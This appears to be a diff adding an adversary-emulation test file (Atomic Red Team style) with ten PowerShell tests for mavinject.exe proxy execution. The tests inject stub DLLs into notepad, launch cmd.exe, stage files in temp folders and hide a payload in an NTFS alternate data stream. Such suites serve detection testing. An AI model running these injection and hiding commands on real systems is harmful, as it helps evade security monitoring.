@@ -1,0 +1,133 @@
+attack_technique: T1218.013
+display_name: System Binary Proxy Execution Mavinject Adversary Emulation Suite
+
+atomic_tests:
+  - name: T1218.013 - Inject DLL into Target Process via Mavinject /INJECTRUNNING
+    description: |
+      Simulates an adversary utilizing mavinject.exe to inject a dynamic-link library into a running process using the /INJECTRUNNING parameter.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $dll = "$env:TEMP\mavinject_stub.dll"; $proc = Start-Process notepad.exe -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Mavinject DLL injection executed."
+      cleanup_command: |
+        $dll = "$env:TEMP\mavinject_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up mavinject process artifacts."
+
+  - name: T1218.013 - Mavinject Process Injection with Module Index Offset Parsing
+    description: |
+      Simulates an adversary utilizing mavinject.exe to perform module allocation and injection passing module index offsets.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $dll = "$env:TEMP\offset_stub.dll"; $proc = Start-Process notepad.exe -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; mavinject.exe $proc.Id /INJECTRUNNING $dll 0x1000; Write-Host "[+] Mavinject offset injection executed."
+      cleanup_command: |
+        $dll = "$env:TEMP\offset_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up offset injection artifacts."
+
+  - name: T1218.013 - Proxy Execution via Mavinject /STARTAPP Virtual Package Trigger
+    description: |
+      Simulates an adversary leveraging mavinject.exe /STARTAPP to launch an arbitrary executable under an App-V subsystem context.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /STARTAPP "$env:SystemRoot\System32\cmd.exe"; Write-Host "[+] Mavinject App-V STARTAPP execution simulated."
+      cleanup_command: |
+        Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up STARTAPP target processes."
+
+  - name: T1218.013 - Mavinject Injection Using Alternate Environment Executable Path
+    description: |
+      Simulates invoking mavinject.exe via explicit system environment variable string concatenation to execute process injection.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $mavPath = Join-Path $env:SystemRoot "System32\mavinject.exe"; $dll = "$env:TEMP\env_stub.dll"; $proc = Start-Process notepad.exe -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; & $mavPath $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Executed Mavinject from explicit path variable."
+      cleanup_command: |
+        $dll = "$env:TEMP\env_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up path variable test artifacts."
+
+  - name: T1218.013 - Mavinject Process Injection from Staged Temporary Subdirectory
+    description: |
+      Simulates staging a DLL inside a deeply nested temp directory before passing it to mavinject.exe for process injection.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $stageDir = "$env:TEMP\MavStage"; if (-not (Test-Path $stageDir)) { New-Item -Path $stageDir -ItemType Directory -Force | Out-Null }; $dll = "$stageDir\staged_payload.dll"; [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)); $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Staged directory Mavinject payload injected."
+      cleanup_command: |
+        $stageDir = "$env:TEMP\MavStage"; if (Test-Path $stageDir) { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up staging directory."
+
+  - name: T1218.013 - Mavinject Command Interpreter Subshell Invocation
+    description: |
+      Simulates calling mavinject.exe through a cmd.exe subshell wrapper to evaluate command interpreter execution chains.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $dll = "$env:TEMP\cmd_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $proc = Start-Process notepad.exe -PassThru; cmd.exe /c "mavinject.exe $($proc.Id) /INJECTRUNNING $dll"; Write-Host "[+] Cmd-wrapped Mavinject process injection executed."
+      cleanup_command: |
+        $dll = "$env:TEMP\cmd_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up cmd subshell artifacts."
+
+  - name: T1218.013 - Sequential Dual-Process Mavinject Injection Trigger
+    description: |
+      Simulates an adversary executing back-to-back mavinject.exe injections into two separate target processes.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $dll = "$env:TEMP\dual_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $p1 = Start-Process notepad.exe -PassThru; $p2 = Start-Process notepad.exe -PassThru; mavinject.exe $p1.Id /INJECTRUNNING $dll; mavinject.exe $p2.Id /INJECTRUNNING $dll; Write-Host "[+] Sequential dual-process injection completed."
+      cleanup_command: |
+        $dll = "$env:TEMP\dual_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up dual process injection targets."
+
+  - name: T1218.013 - Mavinject Execution with App-V Environment Policy Switch
+    description: |
+      Simulates an operator abusing mavinject.exe policy configuration switches to override App-V isolation boundaries.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /SET_POLICY 0; Write-Host "[+] Mavinject set policy switch simulated."
+      cleanup_command: |
+        Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up policy switch target process."
+
+  - name: T1218.013 - Mavinject Process Injection targeting App Container Host
+    description: |
+      Simulates injecting a custom payload module into a running target process via mavinject.exe.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $dll = "$env:TEMP\host_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Mavinject injection into host process completed."
+      cleanup_command: |
+        $dll = "$env:TEMP\host_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up target process artifacts."
+
+  - name: T1218.013 - Mavinject Injection with NTFS Alternate Data Stream (ADS) Carrier
+    description: |
+      Simulates an adversary passing a payload stored inside an NTFS Alternate Data Stream to mavinject.exe for process injection.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $carrier = "$env:TEMP\legit_host.txt"; if (Test-Path $carrier) { Remove-Item $carrier -Force -ErrorAction SilentlyContinue }; Set-Content -Path $carrier -Value "Standard text container"; $ads = $carrier + ":mavinject_payload.dll"; Set-Content -Path $ads -Value "MZ_SIMULATED_DLL_HEADER_STREAM"; $proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $ads; Write-Host "[+] ADS payload passed to Mavinject executed."
+      cleanup_command: |
+        $carrier = "$env:TEMP\legit_host.txt"; if (Test-Path $carrier) { Remove-Item $carrier -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up ADS Mavinject artifacts."
